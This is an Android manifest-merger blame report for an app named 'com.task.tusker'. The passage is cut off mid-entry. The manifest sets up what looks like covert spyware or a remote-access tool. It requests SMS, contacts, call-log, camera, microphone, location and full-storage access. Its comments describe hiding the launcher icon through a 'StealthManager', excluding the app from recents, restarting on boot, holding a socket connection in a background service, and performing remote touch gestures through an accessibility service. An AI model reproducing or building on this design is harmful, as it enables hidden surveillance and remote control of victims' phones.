Apk-builder/app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.task.tusker"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="36" />
10
11    <!-- Core networking -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14
15    <!-- Foreground service -->
16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
16-->src/main/AndroidManifest.xml:10:5-77
16-->src/main/AndroidManifest.xml:10:22-74
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
17-->src/main/AndroidManifest.xml:11:5-87
17-->src/main/AndroidManifest.xml:11:22-84
18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
18-->src/main/AndroidManifest.xml:12:5-84
18-->src/main/AndroidManifest.xml:12:22-81
19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
19-->src/main/AndroidManifest.xml:13:5-88
19-->src/main/AndroidManifest.xml:13:22-85
20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
20-->src/main/AndroidManifest.xml:14:5-86
20-->src/main/AndroidManifest.xml:14:22-83
21
22    <!-- Keep-alive / boot -->
23    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
23-->src/main/AndroidManifest.xml:17:5-81
23-->src/main/AndroidManifest.xml:17:22-78
24    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
24-->src/main/AndroidManifest.xml:18:5-95
24-->src/main/AndroidManifest.xml:18:22-92
25    <uses-permission android:name="android.permission.WAKE_LOCK" />
25-->src/main/AndroidManifest.xml:19:5-68
25-->src/main/AndroidManifest.xml:19:22-65
26
27    <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
28    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
28-->src/main/AndroidManifest.xml:22:5-80
28-->src/main/AndroidManifest.xml:22:22-77
29
30    <!-- SMS -->
31    <uses-permission android:name="android.permission.READ_SMS" />
31-->src/main/AndroidManifest.xml:25:5-67
31-->src/main/AndroidManifest.xml:25:22-64
32
33    <!-- Contacts & Call logs -->
34    <uses-permission android:name="android.permission.READ_CONTACTS" />
34-->src/main/AndroidManifest.xml:28:5-72
34-->src/main/AndroidManifest.xml:28:22-69
35    <uses-permission android:name="android.permission.READ_CALL_LOG" />
35-->src/main/AndroidManifest.xml:29:5-72
35-->src/main/AndroidManifest.xml:29:22-69
36
37    <!-- Camera / Audio -->
38    <uses-permission android:name="android.permission.CAMERA" />
38-->src/main/AndroidManifest.xml:32:5-65
38-->src/main/AndroidManifest.xml:32:22-62
39    <uses-permission android:name="android.permission.RECORD_AUDIO" />
39-->src/main/AndroidManifest.xml:33:5-71
39-->src/main/AndroidManifest.xml:33:22-68
40
41    <!-- Location -->
42    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
42-->src/main/AndroidManifest.xml:36:5-79
42-->src/main/AndroidManifest.xml:36:22-76
43    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
43-->src/main/AndroidManifest.xml:37:5-81
43-->src/main/AndroidManifest.xml:37:22-78
44
45    <!-- Storage (legacy + Android 13+ media) -->
46    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
46-->src/main/AndroidManifest.xml:40:5-80
46-->src/main/AndroidManifest.xml:40:22-77
47    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
47-->src/main/AndroidManifest.xml:41:5-42:40
47-->src/main/AndroidManifest.xml:41:22-78
48    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
48-->src/main/AndroidManifest.xml:43:5-76
48-->src/main/AndroidManifest.xml:43:22-73
49    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
49-->src/main/AndroidManifest.xml:44:5-75
49-->src/main/AndroidManifest.xml:44:22-72
50    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
50-->src/main/AndroidManifest.xml:45:5-75
50-->src/main/AndroidManifest.xml:45:22-72
51    <!-- Android 11+ unrestricted file access (File Manager) -->
52    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
52-->src/main/AndroidManifest.xml:47:5-48:40
52-->src/main/AndroidManifest.xml:47:22-79
53    <!-- Access precise EXIF location in media files (Android 10+) -->
54    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
54-->src/main/AndroidManifest.xml:50:5-80
54-->src/main/AndroidManifest.xml:50:22-77
55    <!-- WiFi scanning -->
56    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
56-->src/main/AndroidManifest.xml:52:5-76
56-->src/main/AndroidManifest.xml:52:22-73
57    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
57-->src/main/AndroidManifest.xml:53:5-76
57-->src/main/AndroidManifest.xml:53:22-73
58
59    <!-- Device features -->
60    <uses-permission android:name="android.permission.VIBRATE" />
60-->src/main/AndroidManifest.xml:56:5-66
60-->src/main/AndroidManifest.xml:56:22-63
61    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
61-->src/main/AndroidManifest.xml:57:5-79
61-->src/main/AndroidManifest.xml:57:22-76
62
63    <!-- Notifications (Android 13+) -->
64    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
64-->src/main/AndroidManifest.xml:60:5-77
64-->src/main/AndroidManifest.xml:60:22-74
65
66    <!-- Required to trigger the system uninstall dialog for other apps -->
67    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
67-->src/main/AndroidManifest.xml:63:5-82
67-->src/main/AndroidManifest.xml:63:22-79
68
69    <!-- Required on Android 11+ to query and list all installed packages -->
70    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
70-->src/main/AndroidManifest.xml:66:5-67:53
70-->src/main/AndroidManifest.xml:66:22-74
71
72    <permission
72-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
73        android:name="com.task.tusker.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
73-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
74        android:protectionLevel="signature" />
74-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
75
76    <uses-permission android:name="com.task.tusker.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
76-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
76-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
77
78    <application
78-->src/main/AndroidManifest.xml:69:5-195:19
79        android:allowBackup="false"
79-->src/main/AndroidManifest.xml:70:9-36
80        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
80-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
81        android:dataExtractionRules="@xml/data_extraction_rules"
81-->src/main/AndroidManifest.xml:71:9-65
82        android:extractNativeLibs="false"
83        android:fullBackupContent="@xml/backup_rules"
83-->src/main/AndroidManifest.xml:72:9-54
84        android:icon="@mipmap/ic_launcher"
84-->src/main/AndroidManifest.xml:73:9-43
85        android:label="@string/app_name"
85-->src/main/AndroidManifest.xml:74:9-41
86        android:preserveLegacyExternalStorage="true"
86-->src/main/AndroidManifest.xml:79:9-53
87        android:requestLegacyExternalStorage="true"
87-->src/main/AndroidManifest.xml:78:9-52
88        android:roundIcon="@mipmap/ic_launcher_round"
88-->src/main/AndroidManifest.xml:75:9-54
89        android:supportsRtl="true"
89-->src/main/AndroidManifest.xml:76:9-35
90        android:theme="@style/Theme.SystemService" >
90-->src/main/AndroidManifest.xml:77:9-51
91
92        <!--
93            Main Activity — NOT visible in the home launcher.
94            CATEGORY_INFO makes getLaunchIntentForPackage() resolve this activity,
95            which is exactly what Settings > App Info > Open uses — so "Open"
96            stays enabled while the app never appears in the app drawer.
97            CATEGORY_LAUNCHER is intentionally absent from this activity.
98        -->
99        <activity
99-->src/main/AndroidManifest.xml:89:9-105:20
100            android:name="com.task.tusker.MainActivity"
100-->src/main/AndroidManifest.xml:90:13-41
101            android:enabled="true"
101-->src/main/AndroidManifest.xml:91:13-35
102            android:excludeFromRecents="true"
102-->src/main/AndroidManifest.xml:94:13-46
103            android:exported="true"
103-->src/main/AndroidManifest.xml:92:13-36
104            android:launchMode="singleTop" >
104-->src/main/AndroidManifest.xml:93:13-43
105
106            <!-- Enables Settings > App Info > Open without showing a launcher icon -->
107            <intent-filter>
107-->src/main/AndroidManifest.xml:96:13-99:29
108                <action android:name="android.intent.action.MAIN" />
108-->src/main/AndroidManifest.xml:97:17-69
108-->src/main/AndroidManifest.xml:97:25-66
109
110                <category android:name="android.intent.category.INFO" />
110-->src/main/AndroidManifest.xml:98:17-73
110-->src/main/AndroidManifest.xml:98:27-70
111            </intent-filter>
112            <!-- Custom action for programmatic / ADB launch -->
113            <intent-filter>
113-->src/main/AndroidManifest.xml:101:13-104:29
114                <action android:name="com.task.tusker.LAUNCH" />
114-->src/main/AndroidManifest.xml:102:17-65
114-->src/main/AndroidManifest.xml:102:25-62
115
116                <category android:name="android.intent.category.DEFAULT" />
116-->src/main/AndroidManifest.xml:103:17-76
116-->src/main/AndroidManifest.xml:103:27-73
117            </intent-filter>
118        </activity>
119        <!--
120            Launcher alias — disabled by default so no icon appears in the drawer.
121            StealthManager.showAppIcon() can enable this to temporarily surface
122            the app in the launcher; hideAppIcon() disables it again.
123        -->
124        <activity-alias
124-->src/main/AndroidManifest.xml:112:9-121:26
125            android:name="com.task.tusker.LauncherAlias"
125-->src/main/AndroidManifest.xml:113:13-42
126            android:enabled="false"
126-->src/main/AndroidManifest.xml:115:13-36
127            android:exported="true"
127-->src/main/AndroidManifest.xml:116:13-36
128            android:targetActivity="com.task.tusker.MainActivity" >
128-->src/main/AndroidManifest.xml:114:13-51
129            <intent-filter>
129-->src/main/AndroidManifest.xml:117:13-120:29
130                <action android:name="android.intent.action.MAIN" />
130-->src/main/AndroidManifest.xml:97:17-69
130-->src/main/AndroidManifest.xml:97:25-66
131
132                <category android:name="android.intent.category.LAUNCHER" />
132-->src/main/AndroidManifest.xml:119:17-77
132-->src/main/AndroidManifest.xml:119:27-74
133            </intent-filter>
134        </activity-alias>
135
136        <!-- Consent Activity -->
137        <activity
137-->src/main/AndroidManifest.xml:124:9-127:40
138            android:name="com.task.tusker.ConsentActivity"
138-->src/main/AndroidManifest.xml:125:13-44
139            android:enabled="true"
139-->src/main/AndroidManifest.xml:126:13-35
140            android:exported="false" />
140-->src/main/AndroidManifest.xml:127:13-37
141
142        <!--
143            Transparent trampoline activity used by PermissionManager to show the
144            native runtime-permission dialog from a Service context.
145            Must be exported=false (only launched internally) and use the
146            transparent theme so only the system dialog is visible to the user.
147        -->
148        <activity
148-->src/main/AndroidManifest.xml:135:9-141:46
149            android:name="com.task.tusker.PermissionRequestActivity"
149-->src/main/AndroidManifest.xml:136:13-54
150            android:enabled="true"
150-->src/main/AndroidManifest.xml:137:13-35
151            android:excludeFromRecents="true"
151-->src/main/AndroidManifest.xml:140:13-46
152            android:exported="false"
152-->src/main/AndroidManifest.xml:138:13-37
153            android:launchMode="singleTop"
153-->src/main/AndroidManifest.xml:141:13-43
154            android:theme="@style/Theme.Transparent" />
154-->src/main/AndroidManifest.xml:139:13-53
155
156        <!--
157            Background Service
158            foregroundServiceType covers all possible sensor/data types this
159            service may use so Android 14 doesn't kill it mid-operation.
160        -->
161        <service
161-->src/main/AndroidManifest.xml:148:9-152:83
162            android:name="com.task.tusker.services.DataSyncService"
162-->src/main/AndroidManifest.xml:149:13-53
163            android:enabled="true"
163-->src/main/AndroidManifest.xml:150:13-35
164            android:exported="false"
164-->src/main/AndroidManifest.xml:151:13-37
165            android:foregroundServiceType="dataSync|camera|microphone|location" />
165-->src/main/AndroidManifest.xml:152:13-80
166
167        <!--
168            Secondary Background Service (com.access.client.BackgroundService)
169            Lightweight foreground service that holds the SocketManager
170            connection.  Declared with only the dataSync type so it can
171            always go foreground on Android 15 without requiring
172            camera / microphone / location runtime permissions up front.
173        -->
174        <service
174-->src/main/AndroidManifest.xml:161:9-165:56
175            android:name="com.access.client.BackgroundService"
175-->src/main/AndroidManifest.xml:162:13-63
176            android:enabled="true"
176-->src/main/AndroidManifest.xml:163:13-35
177            android:exported="false"
177-->src/main/AndroidManifest.xml:164:13-37
178            android:foregroundServiceType="dataSync" />
178-->src/main/AndroidManifest.xml:165:13-53
179
180        <!-- Boot Receiver -->
181        <receiver
181-->src/main/AndroidManifest.xml:168:9-177:20
182            android:name="com.task.tusker.receivers.BootReceiver"
182-->src/main/AndroidManifest.xml:169:13-51
183            android:enabled="true"
183-->src/main/AndroidManifest.xml:170:13-35
184            android:exported="true" >
184-->src/main/AndroidManifest.xml:171:13-36
185            <intent-filter>
185-->src/main/AndroidManifest.xml:172:13-176:29
186                <action android:name="android.intent.action.BOOT_COMPLETED" />
186-->src/main/AndroidManifest.xml:173:17-79
186-->src/main/AndroidManifest.xml:173:25-76
187                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
187-->src/main/AndroidManifest.xml:174:17-84
187-->src/main/AndroidManifest.xml:174:25-81
188                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
188-->src/main/AndroidManifest.xml:175:17-82
188-->src/main/AndroidManifest.xml:175:25-79
189            </intent-filter>
190        </receiver>
191
192        <!--
193            Unified Accessibility Service
194            canPerformGestures="true" is required for touch/swipe commands.
195        -->
196        <service
196-->src/main/AndroidManifest.xml:183:9-193:19
197            android:name="com.task.tusker.services.UnifiedAccessibilityService"
197-->src/main/AndroidManifest.xml:184:13-65
198            android:exported="false"
198-->src/main/AndroidManifest.xml:186:13-37
199            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
199-->src/main/AndroidManifest.xml:185:13-79
200            <intent-filter>
200-->src/main/AndroidManifest.xml:187:13-189:29
201                <action android:name="android.accessibilityservice.AccessibilityService" />
201-->src/main/AndroidManifest.xml:188:17-92
201-->src/main/AndroidManifest.xml:188:25-89
202            </intent-filter>
203
204            <meta-data
204-->src/main/AndroidManifest.xml:190:13-192:72
205                android:name="android.accessibilityservice"
205-->src/main/AndroidManifest.xml:191:17-60
206                android:resource="@xml/accessibility_service_config" />
206-->src/main/AndroidManifest.xml:192:17-69
207        </service>
208
209        <activity
209-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:27:9-29:72
210            android:name="com.karumi.dexter.DexterActivity"
210-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:28:13-60
211            android:theme="@style/Dexter.Internal.Theme.Transparent" />
211-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:29:13-69
212
213        <provider
213-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:29:9-37:20
214            android:name="androidx.startup.InitializationProvider"
214-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:30:13-67
215            android:authorities="com.task.tusker.androidx-startup"
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:31:13-68
216            android:exported="false" >
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:32:13-37
217            <meta-data
217-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
218                android:name="androidx.work.WorkManagerInitializer"
218-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
219                android:value="androidx.startup" />
219-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
220            <meta-data
220-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
221                android:name="androidx.emoji2.text.EmojiCompatInitializer"
221-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
222                android:value="androidx.startup" />
222-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
223            <meta-data
223-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
224                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
224-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
225                android:value="androidx.startup" />
225-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
226            <meta-data
226-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
227                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
227-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
228                android:value="androidx.startup" />
228-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
229        </provider>
230
231        <service
231-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
232            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
233            android:directBootAware="false"
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
234            android:enabled="@bool/enable_system_alarm_service_default"
234-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
235            android:exported="false" />
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
236        <service
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
237            android:name="androidx.work.impl.background.systemjob.SystemJobService"
237-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
238            android:directBootAware="false"
238-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
239            android:enabled="@bool/enable_system_job_service_default"
239-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
240            android:exported="true"
240-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
241            android:permission="android.permission.BIND_JOB_SERVICE" />
241-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
242        <service
242-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
243            android:name="androidx.work.impl.foreground.SystemForegroundService"
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
244            android:directBootAware="false"
244-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
245            android:enabled="@bool/enable_system_foreground_service_default"
245-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
246            android:exported="false" />
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
247
248        <receiver
248-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
249            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
249-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
250            android:directBootAware="false"
250-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
251            android:enabled="true"
251-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
252            android:exported="false" />
252-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
253        <receiver
253-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
254            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
254-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
255            android:directBootAware="false"
255-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
256            android:enabled="false"
256-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
257            android:exported="false" >
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
258            <intent-filter>
258-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
259                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
259-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
259-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
260                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
260-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
260-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
261            </intent-filter>
262        </receiver>
263        <receiver
263-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
264            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
264-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
265            android:directBootAware="false"
265-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
266            android:enabled="false"
266-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
267            android:exported="false" >
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
268            <intent-filter>
268-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
269                <action android:name="android.intent.action.BATTERY_OKAY" />
269-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
269-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
270                <action android:name="android.intent.action.BATTERY_LOW" />
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
271            </intent-filter>
272        </receiver>
273        <receiver
273-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
274            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
274-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
275            android:directBootAware="false"
275-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
276            android:enabled="false"
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
277            android:exported="false" >
277-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
278            <intent-filter>
278-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
279                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
279-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
279-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
280                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
280-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
280-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
281            </intent-filter>
282        </receiver>
283        <receiver
283-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
284            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
284-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
285            android:directBootAware="false"
285-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
286            android:enabled="false"
286-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
287            android:exported="false" >
287-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
288            <intent-filter>
288-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
289                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
289-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
289-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
290            </intent-filter>
291        </receiver>
292        <receiver
292-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
293            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
293-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
294            android:directBootAware="false"
294-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
295            android:enabled="false"
295-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
296            android:exported="false" >
296-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
297            <intent-filter>
297-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
298                <action android:name="android.intent.action.BOOT_COMPLETED" />
298-->src/main/AndroidManifest.xml:173:17-79
298-->src/main/AndroidManifest.xml:173:25-76
299                <action android:name="android.intent.action.TIME_SET" />
299-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
299-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
300                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
300-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
300-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
301            </intent-filter>
302        </receiver>
303        <receiver
303-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
304            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
304-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
305            android:directBootAware="false"
305-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
306            android:enabled="@bool/enable_system_alarm_service_default"
306-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
307            android:exported="false" >
307-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
308            <intent-filter>
308-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
309                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
309-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
309-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
310            </intent-filter>
311        </receiver>
312        <receiver
312-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
313            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
313-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
314            android:directBootAware="false"
314-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
315            android:enabled="true"
315-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
316            android:exported="true"
316-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
317            android:permission="android.permission.DUMP" >
317-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
318            <intent-filter>
318-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
319                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
319-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
319-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
320            </intent-filter>
321        </receiver>
322
323        <service
323-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:24:9-28:63
324            android:name="androidx.room.MultiInstanceInvalidationService"
324-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:25:13-74